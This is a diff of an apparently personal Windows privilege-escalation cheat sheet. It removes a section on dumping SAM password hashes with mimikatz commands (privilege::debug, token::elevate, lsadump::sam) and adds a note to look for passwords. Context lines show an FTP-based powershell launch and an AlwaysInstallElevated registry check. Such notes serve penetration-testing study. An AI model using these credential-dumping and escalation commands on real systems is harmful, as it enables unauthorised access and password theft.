@@ -152,20 +152,6 @@ echo !powershell.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
 dir /r | find ":$DATA"
 ```
 
-* Extract hash from SAM Database
-
-```
-Hashed user passwords in the Security Accounts Manager
-
-SAM Database cannot be copied while OS is running but can use mimikatz to dump SAM hashes
-    Mimikatz extract from SAM  
-    SeDebugPrivilge is enabled might be able to run mimikatz with admin cmd 
-    command: privilege::debug 
-    LSASS is a SYSTEM process
-    command: token::elevate to elevate the scurity token from high integrity to SYSTEM integrity
-    command: lsadump::sam to dump contents of SAM database 
-```
-
 * Windows PrivEsc Guide
 
 ```
@@ -273,6 +259,9 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 * Credentials or Hashes
 
 ```
+Look for passwords
+
+
 Windows NT Operating Systems up to Windows 2003 store LM and NTLM password hashes
 Windows Vista and onwards disables LM by default and uses NTLM while NTLM hashes are unsalted
 
